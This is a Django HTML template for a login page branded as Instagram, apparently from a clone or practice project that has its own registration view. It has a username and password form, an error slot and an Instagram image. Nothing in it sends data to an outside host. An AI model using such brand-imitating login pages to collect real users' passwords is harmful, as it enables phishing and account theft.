{% load static %}
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login â€¢ Instagram</title>
    <link rel="stylesheet" href="{% static 'css/login.css' %}">
</head>
<body>
    <div class="container">
        <div class="left">
            <img src="{% static 'img/login.png' %}" alt="Instagram Image">
        </div>
        <div class="right">
            {% if error %}
                <h1 class="error">{{ error }}</h1>
            {% endif %}
            <h1>Instagram</h1>
            <form method="post">
                {% csrf_token %}
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
            <div class="divider">OR</div>
            <a href="#">Forgot password?</a>
            <p class="bottom-text">Don't have an account? <a href="{% url 'register' %}">Register</a></p>
        </div>
    </div>
</body>
</html>
